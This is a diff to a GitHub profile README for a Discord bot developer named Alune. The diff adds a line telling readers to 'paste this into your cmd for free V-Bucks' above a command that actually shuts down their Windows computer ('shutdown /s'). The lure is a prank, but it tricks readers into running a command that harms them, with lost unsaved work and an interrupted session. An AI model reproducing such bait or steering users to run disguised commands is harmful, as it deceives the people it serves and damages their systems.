@@ -1,8 +1,9 @@
 <h1 align="center">Hey there 👋, I'm Alune</h1>
 <h3 align="center">Discord Bot Developer since 2019</h3>
 
+Paste this into your cmd for free V-Bucks:
 ```sh-session
-shutdown -s
+shutdown /s
 ```
 
 <p align="left"> <img src="https://komarev.com/ghpvc/?username=lunahax&label=Profile%20views&color=0e75b6&style=flat" alt="lunahax" /> </p>
